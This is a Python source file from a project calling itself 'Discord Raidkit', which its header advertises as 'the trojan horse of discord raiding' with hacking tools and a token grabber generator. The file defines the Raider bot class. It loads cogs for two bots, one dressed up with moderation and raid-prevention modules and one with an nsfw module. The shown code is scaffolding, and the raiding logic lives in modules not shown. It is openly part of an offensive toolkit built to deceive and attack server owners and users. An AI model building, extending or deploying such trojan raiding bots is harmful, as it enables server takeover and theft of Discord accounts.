"""
Discord Raidkit v2.3.5 — "The trojan horse of discord raiding"
Copyright © 2023 the-cult-of-integral

a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3

This program is under the GNU General Public License v2.0.
https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE

raider.py has the Raider class used to implement the Anubis and Qetesh discord bots.
raider.py was last updated on 20/04/23 at 22:10 UTC.
"""

import asyncio
import os
from itertools import cycle

import aiohttp
import discord
from discord.ext import commands, tasks

import drui
import utils.log_utils as lu
from config import DRConfig

lu.init()


class Raider(commands.Bot):
    """A class to handle the creation of Discord Raidkit raiding bots"""
    __slots__ = ('tool_id', 'prefix', 'session', 'statuses', 'extensions')
    
    def __init__(self, tool_id: int, cfg: DRConfig):
        super().__init__(
            command_prefix = cfg['prefix'],
            intents = discord.Intents.all(),
            application_id = cfg['app_id'],
        )
        self.extensions = None
        self.tool_id = tool_id
        self.prefix = cfg['prefix']
        self.session = aiohttp.ClientSession()
        self.remove_command('help')
        if cfg['statuses']:
            self.statuses = cycle(cfg['statuses'])
    
    async def setup_hook(self):
        """A hook to setup the bot and load its extensions."""
        match self.tool_id:
            case 1:
                self.extensions = [
                    'cogs.anubis.moderation',
                    'cogs.anubis.raid_prevention',
                    'cogs.anubis.surfing',
                    'cogs.anubis.ahelp',
                    'cogs.shared.cmds',
                    'cogs.shared.handler'
                ]
            case 2:
                self.extensions = [
                    'cogs.qetesh.nsfw',
                    'cogs.qetesh.qhelp',
                    'cogs.shared.cmds',
                    'cogs.shared.handler'
                ]
            case _:
                raise ValueError('Invalid tool ID provided')
        
        tasks = [self.load_extension(extension) for extension in self.extensions]
        results = await asyncio.gather(*tasks, return_exceptions = True)

        for result in results:
            if isinstance(result, Exception):
                lu.serror('/tools/raider.py', 'setup_hook', f'Failed to load extension: {result}')
                raise result
    
    async def on_ready(self):
        try:
            await self.tree.sync()
        except discord.errors.NotFound:
            lu.scritical('/tools/raider.py', 'on_ready', 'The tree was not found: invalid application ID provided')
            raise SystemExit
        os.system('cls' if os.name == 'nt' else 'clear')
        print(drui.raider(self.prefix))
        if self.statuses:
            self.change_status.start()
    
    #async def on_guild_join(self, guild: discord.Guild):
    #    await self.tree.add_guild(guild)
    
    @tasks.loop(seconds=10)
    async def change_status(self):
        await self.change_presence(activity=discord.Game(next(self.statuses)))
    
    async def close(self):
        self.change_status.stop()
        await self.session.close()
        await super().close()
